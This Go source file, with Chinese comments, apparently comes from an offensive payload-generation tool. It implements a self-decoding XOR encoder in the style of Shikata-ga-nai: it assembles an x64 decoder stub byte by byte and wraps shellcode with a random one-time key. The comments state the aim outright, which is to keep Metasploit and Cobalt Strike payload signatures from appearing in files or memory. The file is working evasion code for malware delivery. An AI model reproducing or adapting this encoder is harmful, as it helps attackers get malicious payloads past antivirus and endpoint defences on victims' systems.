package encode

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
)

// ============================================================================
// 自解码变形（SGN-like，纯 Go）：把 x64 shellcode 变成
//
//	[ x64 自解码 stub ][ 密文 n 字节 ][ 一次性密钥 n 字节 ]
//
// 运行时 stub 就地 XOR 解码后跳转执行。效果：
//   - 原始 msf/CS/工具字节序列不再以原形态出现在文件或内存（解码窗口极短）；
//   - 不依赖任何外部二进制（EasyShell 的 SGN 需 sgn.exe+keystone.dll 且仅
//     linux/windows-amd64 宿主，与本项目跨平台生成定位冲突，故采用等价纯 Go 方案）。
// 仅支持 x64（amd64）载荷；x86 保持原样由调用方决策。
// ============================================================================

// assembleX64Decoder 以程序化方式生成位置无关解码 stub。
// 布局（每行注释末尾为该行后累计长度）：
//
//	E8 00 00 00 00        call +5                        ; ->5
//	5E                    pop rsi                        ; rsi=ip0+5
//	48 8D 76 xx           lea rsi,[rsi+disp8]            ; rsi=密文起点(ip0+stubLen)
//	48 8D 9E imm32        lea rbx,[rsi+imm32]            ; rbx=密钥起点
//	31 C9                 xor ecx,ecx
//	top:
//	81 F9 imm32           cmp ecx, n
//	7D xx                 jge done
//	8A 04 0E              mov al,[rsi+rcx]
//	32 04 0B              xor al,[rbx+rcx]
//	88 04 0E              mov [rsi+rcx], al
//	FF C1                 inc ecx
//	EB xx                 jmp top
//	done:
//	FF E6                 jmp rsi
func assembleX64Decoder(n int) ([]byte, error) {
	if n <= 0 || n > 0x7FFFFFFF {
		return nil, fmt.Errorf("自解码变形仅支持 1B..2GB 载荷")
	}
	b := make([]byte, 0, 64)
	// call +5
	b = append(b, 0xE8, 0, 0, 0, 0)
	// pop rsi
	b = append(b, 0x5E)
	// lea rsi,[rsi+disp8]（占位，stub 总长确定后回填）
	leaDispIdx := len(b) + 3
	b = append(b, 0x48, 0x8D, 0x76, 0x00)
	// lea rbx,[rsi+imm32]（占位：= n）
	lea32Idx := len(b) + 3
	b = append(b, 0x48, 0x8D, 0x9E, 0, 0, 0, 0)
	// xor ecx,ecx
	b = append(b, 0x31, 0xC9)
	// cmp ecx,n
	cmpIdx := len(b) + 2
	b = append(b, 0x81, 0xF9, 0, 0, 0, 0)
	top := len(b)
	// jge done
	jgeIdx := len(b)
	b = append(b, 0x7D, 0x00)
	// mov al,[rsi+rcx]
	b = append(b, 0x8A, 0x04, 0x0E)
	// xor al,[rbx+rcx]
	b = append(b, 0x32, 0x04, 0x0B)
	// mov [rsi+rcx],al
	b = append(b, 0x88, 0x04, 0x0E)
	// inc ecx
	b = append(b, 0xFF, 0xC1)
	// jmp top
	ebIdx := len(b)
	b = append(b, 0xEB, 0x00)
	done := len(b)
	// jmp rsi
	b = append(b, 0xFF, 0xE6)

	stubLen := len(b)
	b[leaDispIdx] = byte(stubLen - 5) // 密文起点相对 ip0+5
	binary.LittleEndian.PutUint32(b[lea32Idx:], uint32(n))
	binary.LittleEndian.PutUint32(b[cmpIdx:], uint32(n))
	b[jgeIdx+1] = byte(done - (jgeIdx + 2))
	b[ebIdx+1] = byte(top - (ebIdx + 2))
	return b, nil
}

// SelfDecodeXorX64 对 x64 shellcode 做自解码变形，返回可直接交给 loader 的新载荷。
// 一次性密钥每次随机生成，输出恒为 [stub][cipher][key]，n 为原载荷长度。
func SelfDecodeXorX64(orig []byte) ([]byte, error) {
	n := len(orig)
	if n == 0 {
		return nil, fmt.Errorf("载荷为空")
	}
	stub, err := assembleX64Decoder(n)
	if err != nil {
		return nil, err
	}
	key := make([]byte, n)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	cipher := make([]byte, n)
	for i := 0; i < n; i++ {
		cipher[i] = orig[i] ^ key[i]
	}
	out := make([]byte, 0, len(stub)+2*n)
	out = append(out, stub...)
	out = append(out, cipher...)
	out = append(out, key...)
	return out, nil
}
